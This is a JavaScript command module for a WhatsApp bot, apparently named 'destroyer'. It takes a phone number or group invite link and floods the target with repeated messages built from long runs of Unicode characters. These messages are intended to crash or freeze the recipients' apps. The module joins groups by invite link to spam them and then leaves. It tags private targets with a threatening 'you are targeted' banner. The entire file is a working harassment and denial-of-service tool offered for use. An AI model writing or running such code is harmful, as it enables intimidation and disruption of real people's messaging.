module.exports = {
    name: "destroyer",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0];
        if (!target) return msg.reply(fancy("Usage: .destroyer [number or group_link]"));

        const bugPayload = "ॵ".repeat(65) + "ℛ".repeat(60); // Stronger Payload

        if (target.includes("chat.whatsapp.com")) {
            // BUG GROUP BY LINK
            let code = target.split('https://chat.whatsapp.com/')[1];
            let jid = await conn.groupAcceptInvite(code);
            await conn.sendMessage(jid, { text: fancy("ɪɴꜱɪᴅɪᴏᴜꜱ ɪꜱ ʜᴇʀᴇ...") });
            for (let i = 0; i < 10; i++) {
                await conn.sendMessage(jid, { text: bugPayload });
                await new Promise(r => setTimeout(r, 500));
            }
            await conn.groupLeave(jid);
            conn.sendMessage(from, { text: fancy("ɢʀᴏᴜᴘ ᴅᴇꜱᴛʀᴏʏᴇᴅ ᴀɴᴅ ᴇxɪᴛᴇᴅ.") });
        } else {
            // BUG PRIVATE NUMBER
            let jid = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            for (let i = 0; i < 15; i++) {
                await conn.sendMessage(jid, { 
                    text: bugPayload,
                    contextInfo: { 
                        externalAdReply: { 
                            title: "🥀 ɪɴꜱɪᴅɪᴏᴜꜱ ᴠɪʀᴜꜱ 🥀", 
                            body: "ʏᴏᴜ ᴀʀᴇ ᴛᴀʀɢᴇᴛᴇᴅ", 
                            mediaType: 1, 
                            renderLargerThumbnail: true,
                            thumbnailUrl: "https://files.catbox.moe/horror.jpg" 
                        } 
                    } 
                });
            }
            conn.sendMessage(from, { text: fancy(`ʙᴜɢꜱ ꜱᴇɴᴛ ᴛᴏ ${target}.`) });
        }
    }
};